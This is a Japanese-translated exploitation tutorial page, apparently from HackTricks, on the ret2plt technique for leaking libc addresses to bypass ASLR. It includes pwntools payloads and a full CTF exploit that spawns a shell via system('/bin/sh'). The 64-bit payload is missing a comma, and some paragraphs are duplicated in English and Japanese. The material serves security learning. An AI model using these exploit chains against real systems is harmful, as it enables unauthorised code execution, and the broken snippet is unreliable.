# Ret2plt

{{#include ../../../banners/hacktricks-training.md}}

## 基本情報

この手法の目的は、ASLRを回避するためにPLTの関数からアドレスを**leak**することです。これは、例えばlibcの関数`puts`のアドレスをleakすれば、**`libc`のベースアドレスを計算する**ことができ、`system`のような他の関数にアクセスするためのオフセットを算出できるためです。

これは `pwntools` のペイロードで行うことができます。例えば ([**from here**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/plt_and_got)):
```python
# 32-bit ret2plt
payload = flat(
b'A' * padding,
elf.plt['puts'],
elf.symbols['main'],
elf.got['puts']
)

# 64-bit
payload = flat(
b'A' * padding,
POP_RDI,
elf.got['puts']
elf.plt['puts'],
elf.symbols['main']
)
```
Note how **`puts`** (using the address from the PLT) is called with the address of `puts` located in the GOT (Global Offset Table). This is because by the time `puts` prints the GOT entry of puts, this **entry will contain the exact address of `puts` in memory**.

これは、**`puts`** が（PLT のアドレスを使って）GOT (Global Offset Table) にある `puts` のアドレスを引数にして呼ばれている点に注意してください。これは `puts` がその GOT エントリを出力する時点で、その**エントリにはメモリ上の `puts` の正確なアドレスが入っている**ためです。

Also note how the address of `main` is used in the exploit so when `puts` ends its execution, the **binary calls `main` again instead of exiting** (so the leaked address will continue to be valid).

また、エクスプロイトで `main` のアドレスが使われている点にも注意してください。これにより `puts` の実行が終わったとき、**バイナリは終了せずに `main` を再度呼び出す**（したがって leaked address は引き続き有効）ことになります。

> [!CAUTION]
> Note how in order for this to work the **binary cannot be compiled with PIE** or you must have **found a leak to bypass PIE** in order to know the address of the PLT, GOT and main. Otherwise, you need to bypass PIE first.

> [!CAUTION]
> この手法を機能させるには、**binary cannot be compiled with PIE** か、PLT、GOT、main のアドレスを知るために **found a leak to bypass PIE** している必要がある点に注意してください。さもなければ、まず PIE をバイパスする必要があります。

You can find a [**full example of this bypass here**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/ret2plt-aslr-bypass). This was the final exploit from that **example**:

このバイパスの[**full example of this bypass here**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/ret2plt-aslr-bypass)を参照してください。以下はその**example**からの最終的な exploit です:

<details>
<summary>Full exploit example (ret2plt leak + system)</summary>
```python
from pwn import *

elf = context.binary = ELF('./vuln-32')
libc = elf.libc
p = process()

p.recvline()

payload = flat(
'A' * 32,
elf.plt['puts'],
elf.sym['main'],
elf.got['puts']
)

p.sendline(payload)

puts_leak = u32(p.recv(4))
p.recvlines(2)

libc.address = puts_leak - libc.sym['puts']
log.success(f'LIBC base: {hex(libc.address)}')

payload = flat(
'A' * 32,
libc.sym['system'],
libc.sym['exit'],
next(libc.search(b'/bin/sh\x00'))
)

p.sendline(payload)

p.interactive()
```
</details>

## 最新の考慮点

- **`-fno-plt` builds** (common in modern distros) replace `call foo@plt` with `call [foo@got]`. If the binary has no `foo@plt` stub, you can still leak the resolved address with `puts(elf.got['foo'])` and then **return directly to the GOT entry** (`flat(padding, elf.got['foo'])`) to jump into libc once lazy binding has completed.
- **Full RELRO / `-Wl,-z,now`**: GOT は読み取り専用になりますが、ret2plt は GOT スロットを読むだけなので leak に対しては依然として有効です。もしシンボルが一度も呼ばれていなければ、最初の ret2plt が lazy binding を行い、解決されたスロットを出力します。
- **ASLR + PIE**: PIE が有効な場合、まずコードポインタ（例: 保存されたリターンアドレス、関数ポインタ、または別の format‑string/infoleak を介した `.plt` エントリ）を leak して PIE ベースを計算し、再配置された PLT/GOT アドレスで ret2plt チェーンを構築します。
- **Non‑x86 architectures with BTI/PAC (AArch64)**: PLT エントリは有効な BTI ランディングパッド（`bti c`）なので、BTI‑enabled なバイナリを exploiting する際は BTI のない libc ガジェットに直接飛ぶのではなく、PLT スタブ（または他の BTI 注釈付きガジェット）にジャンプすることを優先してください。さもないと CPU が `BRK`/`PAC` エラーを発生させます。
- **Quick resolution helper**: 目標の関数がまだ解決されておらず、1 回で leak が必要な場合は PLT 呼び出しを 2 回連鎖させます: まず `elf.plt['foo']`（解決のため）、その後再度 `elf.plt['foo']` を GOT アドレスを引数として呼び出し、今や埋まったスロットを出力します。

## Other examples & References

- [https://guyinatuxedo.github.io/08-bof_dynamic/csawquals17_svc/index.html](https://guyinatuxedo.github.io/08-bof_dynamic/csawquals17_svc/index.html)
- 64 bit、ASLR 有効だが PIE 無し。最初のステップはオーバーフローを埋めて canary の 0x00 バイトまで到達させ、puts を呼んでそれを leak します。canary が判明したら、puts を呼んで GOT から puts のアドレスを leak する ROP ガジェットを作り、その後 `system('/bin/sh')` を呼ぶ ROP ガジェットを作成します。
- [https://guyinatuxedo.github.io/08-bof_dynamic/fb19_overfloat/index.html](https://guyinatuxedo.github.io/08-bof_dynamic/fb19_overfloat/index.html)
- 64 bits、ASLR 有効、canary なし、子関数から main に対するスタックオーバーフロー。puts を呼んで GOT から puts のアドレスを leak する ROP ガジェットを使い、その後 one gadget を呼び出します。

## References

- [MaskRay – All about Procedure Linkage Table](https://maskray.me/blog/2021-09-19-all-about-procedure-linkage-table)

{{#include ../../../banners/hacktricks-training.md}}
